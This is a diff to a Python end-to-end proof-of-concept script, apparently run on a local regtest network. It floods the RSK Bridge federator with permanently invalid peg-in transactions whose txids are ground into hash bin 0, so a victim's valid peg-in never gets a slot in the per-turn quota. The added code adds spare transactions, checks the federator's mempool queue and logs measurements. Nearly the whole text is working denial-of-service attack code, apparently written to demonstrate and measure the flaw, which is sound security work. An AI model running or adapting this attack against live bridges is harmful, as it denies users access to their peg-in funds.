@@ -186,6 +186,7 @@ MIN_PEGIN_SAT = 500_000          # rskj BridgeRegTestConstants.minimumPeginTxVal
 RETIRING_SAT = 2_000             # above dust, far below the minimum
 FANOUT_VALUE = 702_000           # per branch: 500k + 2k + dust + change + fee
 ATTACK_COUNT = 40                # BtcToRskClient.MAXIMUM_REGISTER_BTC_LOCK_TXS_PER_TURN
+SPARE_TXS = 8                    # ground and broadcast only if the queue is short
 BIN_BITS = 7                     # mask 0x7f: bin 0 for any ConcurrentHashMap table
                                  # up to 128 buckets (96 pending txs). Bit 0..6 of the
                                  # bucket index are zero, so *every* attack tx sorts
@@ -1413,29 +1414,51 @@ def stage_attack():
     fu = st["attack_funding"]
     prev_txid = bytes.fromhex(fu["txid"])[::-1]
 
-    # ---- fan out one UTXO into 40 branches -----------------------------
+    # ---- fan out one UTXO into 40 branches (+ spares) -------------------
+    # The spares are not paranoia: a branch that never reaches the federator's
+    # mempool before its block is skipped forever (see the check below), and one
+    # missing attack tx is enough to hand the victim the last quota slot.
+    slots = ATTACK_COUNT + SPARE_TXS
     if "funding_txid" not in st:
-        outs = [(FANOUT_VALUE, prev_script)] * ATTACK_COUNT
-        total = FANOUT_VALUE * ATTACK_COUNT
-        fee = 2_000 + ATTACK_COUNT * 34
+        outs = [(FANOUT_VALUE, prev_script)] * slots
+        total = FANOUT_VALUE * slots
+        fee = 2_000 + slots * 34
         change = fu["sat"] - total - fee
+        if change <= 0:
+            raise RuntimeError("the attacker funding cannot cover %d branches" % slots)
         outs.append((change, prev_script))
         raw, txid = sign_tx(ATTACKER, prev_txid, fu["vout"], prev_script, outs)
         btc("sendrawtransaction", [raw.hex()])
         mine(1)
-        log("[attack] fan-out tx %s -> %d x %d sat" % (txid[::-1].hex(), ATTACK_COUNT, FANOUT_VALUE))
+        log("[attack] fan-out tx %s -> %d x %d sat"
+            % (txid[::-1].hex(), slots, FANOUT_VALUE))
         st["funding_txid"] = txid[::-1].hex()
+        st["fanout_slots"] = slots
         save_state(st)
+    elif st.get("fanout_slots") != slots:
+        raise RuntimeError(
+            "state.json was written by a run with %s fan-out branches, this build "
+            "wants %d. Start from scratch (./e2e/run.sh without --from)."
+            % (st.get("fanout_slots"), slots))
     funding_txid = bytes.fromhex(st["funding_txid"])[::-1]
 
     # ---- build + grind + broadcast the 40 attack transactions ----------
+    # Each one spends its own fan-out output (vout 0..slots-1) and pays
+    #   MIN_PEGIN_SAT to the active federation,
+    #   RETIRING_SAT   to the retiring federation,
+    #   a dust output and change back to the attacker.
+    # The second output is what the Bridge rejects: with RSKIP379 every output to
+    # a live federation must be at least the minimum peg-in value, so the tx is
+    # INVALID_AMOUNT forever. It is also why the tx has to pay the retiring
+    # federation: that is what makes it a *live federation* output.
     mask = (1 << BIN_BITS) - 1
     attack = []
-    for i in range(ATTACK_COUNT):
+
+    def broadcast_one(slot):
         attempts = 0
         while True:
             attempts += 1
-            dust = 546 + ((i * 7919 + attempts * 40503) % 60_000)
+            dust = 546 + ((slot * 7919 + attempts * 40503) % 60_000)
             change = FANOUT_VALUE - MIN_PEGIN_SAT - RETIRING_SAT - dust - 1_200
             outs = [
                 (MIN_PEGIN_SAT, spk_active),
@@ -1443,16 +1466,64 @@ def stage_attack():
                 (dust, prev_script),
                 (change, prev_script),
             ]
-            raw, txid = sign_tx(ATTACKER, funding_txid, i, prev_script, outs)
+            raw, txid = sign_tx(ATTACKER, funding_txid, slot, prev_script, outs)
             if bin_index(txid, mask) == 0:
                 break
-        # the 40 outputs of the fan-out are vout 0..39
         btc("sendrawtransaction", [raw.hex()])
-        attack.append({"txid": txid[::-1].hex(), "attempts": attempts})
-        if (i + 1) % 10 == 0:
-            log("         %2d/%d broadcast (avg %d attempts)" % (i + 1, ATTACK_COUNT, attempts))
+        rec = {"txid": txid[::-1].hex(), "slot": slot, "attempts": attempts}
+        attack.append(rec)
+        return rec
 
-    log("[attack] %d attack txs broadcast, all in bin 0" % ATTACK_COUNT)
+    offsets = log_offsets()
+    for i in range(ATTACK_COUNT):
+        rec = broadcast_one(i)
+        if (i + 1) % 10 == 0:
+            log("         %2d/%d broadcast (avg %d attempts)"
+                % (i + 1, ATTACK_COUNT, rec["attempts"]))
+    log("[attack] %d attack txs broadcast, all ground into bin 0" % len(attack))
+
+    # ---- the queue has to be full BEFORE the block, not after -----------
+    # BtcToRskClient.onBlock only stores a merkle proof for a tx it already
+    # tracks (:259); onTransaction is what puts it there (:389). A tx the
+    # federator first hears about inside a block gets no proof and is silently
+    # skipped forever. With 39 sendable attack txs the per-turn quota of 40 has
+    # one slot left, and the victim takes it -- exactly what happened in the run
+    # before this check existed. So: wait for the mempool, top up with a spare if
+    # the queue is short, and refuse to go on if it still is.
+    def queue_size():
+        import re as _re
+        seen = set()
+        for line in log_since(r"\[onTransaction\] [0-9a-f]{64}", offsets):
+            m = _re.search(r"\[onTransaction\] ([0-9a-f]{64})", line)
+            if m:
+                seen.add(m.group(1))
+        return sum(1 for a in attack if a["txid"] in seen)
+
+    def wait_for_queue(want, timeout):
+        end = time.time() + timeout
+        n = queue_size()
+        while n < want and time.time() < end:
+            time.sleep(3)
+            n = queue_size()
+        return n
+
+    queued = wait_for_queue(ATTACK_COUNT, 90)
+    log("[attack] %d/%d reached the federator's mempool before any block"
+        % (queued, len(attack)))
+    slot = ATTACK_COUNT
+    while queued < ATTACK_COUNT and slot < ATTACK_COUNT + SPARE_TXS:
+        rec = broadcast_one(slot)
+        slot += 1
+        queued = wait_for_queue(ATTACK_COUNT, 60)
+        log("[attack] spare %s broadcast (slot %d); %d/%d now queued"
+            % (rec["txid"][:12], rec["slot"], queued, len(attack)))
+    if queued < ATTACK_COUNT:
+        raise RuntimeError(
+            "only %d of the attack txs reached the federator's mempool, and %d spares "
+            "did not make up the difference. The per-turn quota is %d sendable txs; "
+            "with a shorter queue the victim gets the last slot and the flood proves "
+            "nothing, so there is no point in measuring."
+            % (queued, SPARE_TXS, ATTACK_COUNT))
 
     # ---- the victim: one ordinary, perfectly valid peg-in --------------
     if "victim_txid" not in st:
@@ -1511,6 +1582,20 @@ def stage_attack():
     # turn) while none of the 40 hashes and not the victim's hash ever get a
     # processed height. If the victim is processed here the attack did not work
     # and there is no point in measuring.
+    # how many txs the federator now has waiting, from its own log: this is the
+    # queue the per-turn quota of 40 is taken from, so it has to be > 40
+    import re as _re2
+    depths = [int(m.group(1)) for m in
+              (_re2.search(r"Tx to send count: (\d+)", l) for l in
+               log_since(r"Tx to send count: [0-9]+", offsets))
+              if m]
+    if depths:
+        log("[attack] the federator's pending list holds %d txs (quota %d per turn)"
+            % (max(depths), ATTACK_COUNT))
+        if max(depths) <= ATTACK_COUNT - 1:
+            log("[attack] WARNING: the queue is not deeper than the quota, so the "
+                "victim has a slot")
+
     n1 = int(rsk("eth_getTransactionCount", [rsk_address(F1), "latest"]), 16)
     n2 = int(rsk_b("eth_getTransactionCount", [rsk_address(F2), "latest"]), 16)
     turn0 = n1 + n2
@@ -1526,10 +1611,15 @@ def stage_attack():
         if processed_height(st["victim_txid"]) >= 0:
             stage_measure("early")
             raise RuntimeError(
-                "the victim peg-in was processed during the window: the flood did not "
-                "starve registerBtcTransaction. Check that all 40 attack txs are in "
-                "bin 0 of the federator's pending map and that the retiring federation "
-                "is still live (see $LOGS/rsk.log, grep updateBridgeBtcTransactions)")
+                "the victim peg-in was processed during the window, so the flood did "
+                "not starve registerBtcTransaction.\n"
+                "  the per-turn quota is %d sendable txs and all attack txs are ground\n"
+                "  into bin 0 of the federator's pending map, which is also hash bucket\n"
+                "  0 of that ConcurrentHashMap, so they are always offered first.\n"
+                "  A victim that still gets through means fewer than %d of them were\n"
+                "  sendable in some turn: check the 'pending list holds N txs' line and\n"
+                "  grep the federator log for 'Removed transaction' (shouldSendTx false)."
+                % (ATTACK_COUNT, ATTACK_COUNT))
         try:
             n = (int(rsk("eth_getTransactionCount", [rsk_address(F1), "latest"]), 16)
                  + int(rsk_b("eth_getTransactionCount", [rsk_address(F2), "latest"]), 16))
@@ -1589,6 +1679,7 @@ def stage_measure(label="t"):
         "federator_nonce": fed_nonce,
         "victim_balance_wei": str(vic_bal),
         "victim_processed_height": vic_h,
+        "attack_count": len(ah),
         "attacker_processed": len(ah) - unprocessed,
         "attacker_unprocessed": unprocessed,
         "attacker_balance_wei": str(balance(attacker_rsk)),
@@ -1601,8 +1692,8 @@ def stage_measure(label="t"):
         % out["federator_nonce"])
     log("  victim  balance            %s wei" % out["victim_balance_wei"])
     log("  victim  processed height   %d  (-1 = never)" % vic_h)
-    log("  attack  40 txs processed   %d" % out["attacker_processed"])
-    log("  attack  40 txs unprocessed %d" % out["attacker_unprocessed"])
+    log("  attack  %d txs processed   %d" % (out["attack_count"], out["attacker_processed"]))
+    log("  attack  %d txs unprocessed %d" % (out["attack_count"], out["attacker_unprocessed"]))
     log("  attacker balance           %s wei" % out["attacker_balance_wei"])
     log("")
 
